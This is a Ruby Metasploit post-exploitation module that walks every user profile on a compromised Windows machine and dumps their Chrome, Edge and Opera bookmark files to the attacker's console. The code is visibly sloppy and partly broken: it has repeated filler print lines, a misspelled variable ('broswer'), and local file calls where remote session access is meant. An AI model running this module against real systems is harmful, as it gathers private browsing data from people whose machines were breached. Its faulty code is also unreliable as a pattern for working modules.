class MetasploitModule < Msf::Post
    include Msf::Post::File
    include Msf::Post::Windows::UserProfiles
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Bookmarked Sites Retriever',
          'Description' => %q{
            This module discovers information about a target by retrieving their bookmarked websites on Google Chrome, Opera and Microsoft Edge.
          },
          'License' => MSF_LICENSE,
          'Author' => [ 'jerrelgordon'],
          'Platform' => [ 'win' ],
          'SessionTypes' => [ 'meterpreter', 'shell' ]
        )
   )
    end

    def run
      
      GetBookmarks("GoogleChrome") #gets bookmarks for google chrome
      GetBookmarks("Opera") #gets bookmarks for opera
      GetBookmarks("Edge") #gets bookmarks for edge

    end


    def GetBookmarks (browser)

      print_status("Bookmarks on: " + browser) 
      fileexists = false #initializes file as not found
  
      grab_user_profiles().each do |user| #parses information for all users on target machine into a list.
        
        #If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"


        if (browser == "GoogleChrome")
          next unless user['LocalAppData']
          bookmark_path = user['LocalAppData'] + "\\Google\\Chrome\\User Data\\Default\\Bookmarks" #sets path for Google Chrome Bookmarks
          puts "Google Chrome Google Chrome Google Chrome"
          puts "Google Chrome Google Chrome Google Chrome"
          puts "Google Chrome Google Chrome Google Chrome"
          puts "Google Chrome Google Chrome Google Chrome"
          puts "Google Chrome Google Chrome Google Chrome"

        elsif (browser == "Edge")
          next unless user['LocalAppData']
          bookmark_path = user['LocalAppData'] + "\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" #sets path for Microsoft Edge Bookmarks
          puts "Edge Edge Edge"
          puts "Edge Edge Edge"
          puts "Edge Edge Edge"
          puts "Edge Edge Edge"
          puts "Edge Edge Edge"


        elsif (browser == "Opera")
          next unless user['AppData']
          bookmark_path = user['AppData'] + "\\Opera Software\\Opera Stable\\Bookmarks" #sets path for Opera Bookmarks
          puts "Opera Opera Opera"
          puts "Opera Opera Opera"
          puts "Opera Opera Opera"
          puts "Opera Opera Opera"
          puts "Opera Opera Opera"

        end
        
        next unless file?(bookmark_path) #if file exist it is set to found, then all the bookmarks are outputted to standard output (the shell)

          fileexists = true
          puts "BOOKMARKS FOR " + user['ProfileDir']
          puts "\n"
          file = File.open(bookmark_path)
    
          File.foreach(bookmark_path) { |line| puts line }
    
          file.close
      

      end

      if (fileexists == false) # if file was not found, prints no file found.
        puts "No Bookmarks found for " + broswer
      
      end

    end
  

  end
